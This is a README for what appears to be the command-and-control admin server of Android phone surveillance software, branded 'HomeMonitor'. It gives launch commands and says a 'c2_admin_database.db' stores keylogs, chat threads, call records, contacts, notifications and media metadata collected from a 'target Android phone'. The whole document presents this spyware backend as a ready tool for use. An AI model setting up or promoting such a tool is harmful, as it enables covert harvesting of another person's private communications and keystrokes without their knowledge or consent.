# 🛡️ HomeMonitor Linux Master Admin Application

The **HomeMonitor Linux Master Admin Application** is a dedicated server application designed to run locally on your Linux machine or Linux server desktop.

It provides **100% Admin local disk persistent storage**, server-side SQLite database persistence, and hosts the Web Dashboard locally on port `5467`.

---

## 🚀 How to Run on Linux

### Quick Launch (Script)
Run the launcher script:
```bash
./start-admin-app.sh
```

### Python Launch (Zero Dependency)
Runs natively on any Linux distribution with Python 3:
```bash
python3 server.py
```

### Node.js Launch
```bash
node server.js
```

---

## 📁 Storage & Features

1. **Persistent SQLite Database (`c2_admin_database.db`)**:
   - Stores all telemetry, chat threads, call records, contacts, keylogs, notifications, and media file metadata locally on your Linux filesystem (`admin-app/c2_admin_database.db`).
   - Does not burden the target Android phone's storage.

2. **Local Web Dashboard Hosting**:
   - Access the dashboard at `http://localhost:5467`.
